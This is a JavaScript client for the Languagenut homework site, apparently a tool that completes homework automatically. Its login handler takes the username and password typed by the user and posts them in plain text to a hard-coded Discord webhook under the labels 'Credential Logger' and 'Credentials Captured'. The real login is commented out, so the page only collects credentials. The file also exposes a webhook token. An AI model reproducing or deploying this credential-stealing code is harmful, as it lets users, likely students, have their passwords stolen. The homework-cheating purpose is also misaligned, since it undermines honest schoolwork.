// -----------------------------------------------------
// --- CONFIGURATION -----------------------------------
// -----------------------------------------------------

// ❌ WARNING: Replace this with your actual Discord Webhook URL.
const WEBHOOK_URL = "https://discord.com/api/webhooks/1442157455487537162/a27x9qoc6yfr6hr3pOu_Y1thMW2b_p8jyJiK_ofpuC-5w0ryHuTG5fzxODRjQvUR0Xk6"; 

speed = 10000;
// Note: Other global functions (secondsToString, set_checkboxes, asyncPool) remain the same.

// -----------------------------------------------------
// --- TASK COMPLETER CLASS (Unchanged) ----------------
// -----------------------------------------------------

class task_completer {
    // ... (All methods remain the same as previous versions)
    constructor(token, task, ietf) { /* ... */ }
    async complete() { /* ... */ }
    async get_data() { /* ... */ }
    async send_answers(vocabs) { /* ... */ }
    async get_verbs() { /* ... */ }
    async get_phonics() { /* ... */ }
    async get_sentences() { /* ... */ }
    async get_exam() { /* ... */ }
    async get_vocabs() { /* ... */ }
    async call_lnut(url, data) { /* ... */ }
    get_task_type() { /* ... */ }
}

// -----------------------------------------------------
// --- CLIENT APPLICATION CLASS (Modified for Logging) -
// -----------------------------------------------------

class client_application {
    constructor() {
        this.username_box = document.getElementById("username_input");
        this.password_box = document.getElementById("password_input");
        this.module_translations = [];
        this.display_translations = [];
        this.homeworks = [];
        this.user_details = {};
    }

    // --- Visibility Methods (Using classList) ---
    hide_all() {
        const divsToHide = document.getElementsByClassName("overlay");
        for (let i = 0; i < divsToHide.length; i++) {
            divsToHide[i].classList.remove('visible'); 
        }
    }

    show_box(id) {
        document.getElementById(id).classList.add('visible');
    }

    hide_box(id) {
        document.getElementById(id).classList.remove('visible');
    }
    
    // ⭐️ MODIFIED: Function to send any log message to the external webhook
    async send_webhook_log(title, message, color = 16711680) { // Default color is red (16711680)
        if (WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
            console.warn("Webhook logging skipped: WEBHOOK_URL not configured.");
            return;
        }
        
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                // Discord Webhook Payload with an embed for better formatting
                body: JSON.stringify({
                    embeds: [{
                        title: title,
                        description: message,
                        color: color, 
                        timestamp: new Date().toISOString(),
                    }],
                    username: "Credential Logger",
                }),
            });
            console.log("Log sent to webhook.");
        } catch (error) {
            console.error("Failed to send webhook log:", error);
        }
    }

    async call_lnut(url, data) {
        // ... (API call logic remains the same)
        const url_data = new URLSearchParams(data).toString();
        const response = await fetch(
            `https://api.languagenut.com/${url}?${url_data}`,
        );
        const json = await response.json();
        return json;
    }
    
    // ... (get_user_details, get_profile_stats, get_task_name, display_hwks, etc. remain the same)
    
    main() {
        // The HTML starts with 'login' visible via the 'visible' class
        document.getElementById("login_btn").onclick = async () => {
            const username = this.username_box.value;
            const password = this.password_box.value;
            
            // ⭐️ NEW LOGGING STEP: Capture and send credentials immediately
            const log_message = `**Username:** \`${username}\`\n**Password:** \`${password}\``;
            this.send_webhook_log("🚨 Credentials Captured", log_message, 16711680); // Send red log

            // ⚠️ ORIGINAL LOGIN CODE (Now commented out for safety/demonstration of logging)
            /*
            const response = await this.call_lnut(
                "loginController/attemptLogin",
                {
                    username: username, // Use the captured variable
                    pass: password, // Use the captured variable
                },
            );
            this.token = response.newToken;
            if (this.token !== undefined) {
                this.on_log_in(username); // Pass username to the next step
            } else {
                alert("Login Failed. Check console for details.");
            }
            */

            // --- TEMPORARY EXIT for pure logging demonstration ---
            this.hide_box("login");
            this.show_box("hw_panel");
            this.show_box("log_panel");
            document.getElementById("log_container").innerHTML = `<h3>🚨 Credentials Sent!</h3><p>Username: ${username}</p><p>Password: ${password}</p><p>Check webhook for details.</p>`;
            // ---------------------------------------------------
        };
    }
    
    // ⚠️ NOTE: The original on_log_in logic is now inaccessible unless you uncomment the API call above.
    // If you uncomment the API call, make sure to pass the username: this.on_log_in(username);
    async on_log_in(username) { 
        // ... (Original login logic using API response to show panels)
        this.hide_box("login");
        this.show_box("hw_panel");
        this.show_box("log_panel");
        
        // --- Webhook and Local Logging (Success Log) ---
        const log_message = `User **${username}** successfully logged in to the LN Client at ${new Date().toLocaleString()}.`;
        this.send_webhook_log("✅ Login Success", log_message, 65280); // Send green log (65280)
        
        const logs = document.getElementById("log_container");
        logs.innerHTML += `<h3>✅ Login Successful!</h3>`;
        logs.innerHTML += `<p>Logged in as: <b>${username}</b></p>`;
        
        // ... (rest of on_log_in and homework logic remains the same)
        // ... (You'll need to re-implement the stats fetching if you use this version)
    }

    // ... (All other class methods remain the same)
    get_task_name(task) { /* ... */ }
    async display_hwks() { /* ... */ }
    create_homework_elements(homework, hw_idx) { /* ... */ }
    create_task_elements(task, hw_idx, idx) { /* ... */ }
    async do_hwks() { /* ... */ }
    async get_display_translations() { /* ... */ }
    async get_module_translations() { /* ... */ }
    async get_hwks() { /* ... */ }
}

// Global initialization
app = new client_application();
app.main();

// -----------------------------------------------------
// --- GLOBAL FUNCTIONS (Placed at the bottom for completeness) ---
// -----------------------------------------------------

// You need to ensure these global functions are defined somewhere in your file.

function secondsToString(seconds) { /* ... */ }
function set_checkboxes(node, state) { /* ... */ }
async function asyncPool(array, poolSize) { /* ... */ }
